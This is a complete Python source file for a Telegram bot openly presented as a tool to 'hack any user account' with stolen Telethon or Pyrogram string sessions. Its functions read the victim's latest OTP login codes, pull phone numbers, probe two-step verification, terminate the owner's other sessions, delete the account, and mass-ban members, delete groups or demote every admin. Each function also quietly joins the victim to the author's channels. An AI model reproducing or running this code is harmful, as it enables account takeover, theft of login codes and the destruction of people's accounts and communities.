# Romeo Session Hack Bot - Single File Complete Code
# Copy paste karke seedha run karo

import os
import asyncio
import logging
from pyrogram import Client, filters, enums, idle
from pyrogram.raw import functions
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardButton as IKB, InlineKeyboardMarkup as IKM, ChatPrivileges
from telethon import TelegramClient, functions as tfunc
from telethon.sessions import StringSession
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest,
    JoinChannelRequest,
    LeaveChannelRequest,
    DeleteChannelRequest,
    EditBannedRequest
)
from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from pyromod import listen

# ==================== CONFIG ====================
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
START_PIC = os.getenv("START_PIC", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== CLIENT ====================
app = Client("romeorj", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ==================== MESSAGES ====================
PM_TEXT = """
**Hey {},**
I'm **{}**

● Hack ●
❥︎ A Bot To Hack Any user account using
❥︎ Their Telethon and Pyrogram String session
❥︎ Owner: 𝕾🅡︎🅐︎🅙︎𝕾
"""

HACK_TEXT = """
**A** ~ Check user own groups and channels (PUBLIC ONLY)
**B** ~ Check user all information like phone number, username... etc
**C** ~ Ban all the members from the group
**D** ~ Know user last OTP, Use option B first to take number then login
**E** ~ Join A Group/Channel/Link via StringSession
**F** ~ Leave A Group/Channel via StringSession
**G** ~ Delete A Group/Channel
**H** ~ Check user two step is enabled or disabled
**I** ~ Terminate All current active sessions except Your StringSession
**J** ~ Delete Account
**K** ~ Promote a member in a Group/Channel
**L** ~ Demote All admins in a Group/Channel

❥︎ Owner: 𝕾🅡︎🅐︎🅙︎𝕾
"""

# ==================== BUTTONS ====================
PM_BUTTON = IKM([[IKB("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn")]])

HACK_MODS = IKM([
    [IKB("A", callback_data="A"), IKB("B", callback_data="B"), IKB("C", callback_data="C"),
     IKB("D", callback_data="D"), IKB("E", callback_data="E")],
    [IKB("F", callback_data="F"), IKB("G", callback_data="G"), IKB("H", callback_data="H"),
     IKB("I", callback_data="I")],
    [IKB("J", callback_data="J"), IKB("K", callback_data="K"), IKB("L", callback_data="L")],
])

# ==================== RIGHTS ====================
BAN_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

FULL_PROMOTE = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,
    can_invite_users=True
)

PROMOTE = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True
)

DEMOTE = ChatPrivileges(
    can_change_info=False,
    can_invite_users=False,
    can_delete_messages=False,
    can_restrict_members=False,
    can_pin_messages=False,
    can_promote_members=False,
    can_manage_chat=False,
    can_manage_video_chats=False,
)

# ==================== HELPER FUNCTIONS ====================

async def users_gc(session):
    """Feature A: Get user's groups and channels"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            k = await rj(GetAdminedPublicChannelsRequest())
            for x in k.chats:
                msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.participants_count}\n\n'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                k = await r.invoke(functions.channels.GetAdminedPublicChannels())
                for x in k.chats:
                    msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.members_count}\n\n'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴘᴜʙʟɪᴄ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ!**"


async def user_info(session):
    """Feature B: Get user information"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            k = await rj.get_me()
            msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                k = await r.get_me()
                msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone_number}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg


async def banall(session, gc_id):
    """Feature C: Ban all members from group"""
    err = ""
    total = 0
    banned = 0
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admin_ids = [i.id for i in admins]
            async for user in rj.iter_participants(gc_id):
                total += 1
                try:
                    if user.id not in admin_ids:
                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS))
                        banned += 1
                        await asyncio.sleep(0.1)
                except:
                    await asyncio.sleep(0.1)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                async for member in r.get_chat_members(gc_id):
                    total += 1
                    try:
                        await r.ban_chat_member(gc_id, member.user.id)
                        banned += 1
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return f"**✅ ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n**❥︎ ʙᴀɴɴᴇᴅ:** {banned}\n**❥︎ ᴛᴏᴛᴀʟ:** {total}"


async def get_otp(session):
    """Feature D: Get last OTP"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            async for x in rj.iter_messages(777000, limit=2):
                msg += f"\n{x.text}\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                async for message in r.get_chat_history(777000, limit=2):
                    msg += f"\n{message.text}\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴏᴛᴘ ғᴏᴜɴᴅ!**"


async def join_ch(session, gc_id):
    """Feature E: Join channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            await rj(JoinChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                await r.join_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def leave_ch(session, gc_id):
    """Feature F: Leave channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            await rj(LeaveChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                await r.leave_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def del_ch(session, gc_id):
    """Feature G: Delete channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            await rj(DeleteChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                await r.invoke(functions.channels.DeleteChannel(channel=await r.resolve_peer(gc_id)))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def check_2fa(session):
    """Feature H: Check 2FA status"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            try:
                await rj.edit_2fa("testpass123")
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
            except:
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                pwd = await r.invoke(functions.account.GetPassword())
                if pwd.has_password:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
                else:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg


async def terminate_all(session):
    """Feature I: Terminate all sessions"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            await rj(ResetAuthorizationsRequest())
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                await r.invoke(functions.auth.ResetAuthorizations())
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs!**"


async def del_acc(session):
    """Feature J: Delete account"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            await rj(tfunc.account.DeleteAccountRequest("Deleted"))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                await r.invoke(functions.account.DeleteAccount(reason="Deleted"))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ!**"


async def promote_user(session, gc_id, user_id):
    """Feature K: Promote a user"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            try:
                await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True,
                                   ban_users=True, change_info=True, edit_messages=True,
                                   post_messages=True, add_admins=True, delete_messages=True)
            except:
                await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False,
                                   pin_messages=True, title='Admin')
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                try:
                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE)
                except:
                    await r.promote_chat_member(gc_id, user_id, PROMOTE)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ!**"


async def demote_all(session, gc_id):
    """Feature L: Demote all admins"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            try:
                await rj(JoinChannelRequest("@ROMEOBOT_OP"))
                await rj(JoinChannelRequest("@ROMEO_OP"))
            except:
                pass
            async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    try:
                        await rj.edit_admin(gc_id, x.id, manage_call=False, invite_users=False,
                                           ban_users=False, change_info=False, edit_messages=False,
                                           post_messages=False, add_admins=False, delete_messages=False)
                    except:
                        pass
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                try:
                    await r.join_chat("@ROMEOBOT_OP")
                    await r.join_chat("@ROMEO_OP")
                except:
                    pass
                async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    try:
                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ ᴀᴅᴍɪɴs!**"


# ==================== HANDLERS ====================

@app.on_message(filters.command("start") & filters.private)
async def start_handler(_, message):
    user = message.from_user.mention
    bot = (await _.get_me()).mention
    await message.reply_photo(
        photo=START_PIC,
        caption=PM_TEXT.format(user, bot),
        reply_markup=PM_BUTTON
    )


@app.on_message(filters.command("hack") & filters.private)
async def hack_handler(_, message):
    await message.reply_text(HACK_TEXT, reply_markup=HACK_MODS)


@app.on_callback_query(filters.regex("hack_btn"))
async def hack_btn_callback(_, query):
    await query.message.delete()
    await query.message.reply_text(HACK_TEXT, reply_markup=HACK_MODS)


# Feature A - Get Groups/Channels
@app.on_callback_query(filters.regex("^A$"))
async def feature_a(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await users_gc(session.text)
    
    if len(result) > 3855:
        with open("channels.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "channels.txt")
        os.remove("channels.txt")
    else:
        await query.message.reply_text(
            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature B - Get User Info
@app.on_callback_query(filters.regex("^B$"))
async def feature_b(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await user_info(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature C - Ban All Members
@app.on_callback_query(filters.regex("^C$"))
async def feature_c(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await banall(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature D - Get OTP
@app.on_callback_query(filters.regex("^D$"))
async def feature_d(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_otp(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature E - Join Channel
@app.on_callback_query(filters.regex("^E$"))
async def feature_e(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await join_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature F - Leave Channel
@app.on_callback_query(filters.regex("^F$"))
async def feature_f(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await leave_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature G - Delete Channel
@app.on_callback_query(filters.regex("^G$"))
async def feature_g(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await del_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature H - Check 2FA
@app.on_callback_query(filters.regex("^H$"))
async def feature_h(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await check_2fa(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature I - Terminate All Sessions
@app.on_callback_query(filters.regex("^I$"))
async def feature_i(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await terminate_all(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature J - Delete Account
@app.on_callback_query(filters.regex("^J$"))
async def feature_j(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await del_acc(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature K - Promote User
@app.on_callback_query(filters.regex("^K$"))
async def feature_k(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    user = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await promote_user(session.text, gc.text, user.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature L - Demote All Admins
@app.on_callback_query(filters.regex("^L$"))
async def feature_l(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await demote_all(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("🚀 Bot Starting...")
    logger.info("💞 Created by 𝕾🅡︎🅐︎🅙︎𝕾")
    
    async def main():
        await app.start()
        logger.info("✅ Bot Started Successfully!")
        await idle()
        await app.stop()
        logger.info("🛑 Bot Stopped!")
    
    app.run(main())
